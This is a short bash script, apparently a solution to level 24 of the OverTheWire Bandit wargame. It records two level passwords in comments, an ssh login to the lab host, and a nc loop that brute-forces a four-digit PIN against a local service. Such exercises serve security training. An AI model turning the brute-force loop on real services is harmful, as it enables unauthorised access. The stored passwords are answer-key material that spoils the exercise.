#!/bin/bash
# bandit24 password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
# bandit25 password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

ssh bandit24@bandit.labs.overthewire.org -p 2220
#Inside SSH:
for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002
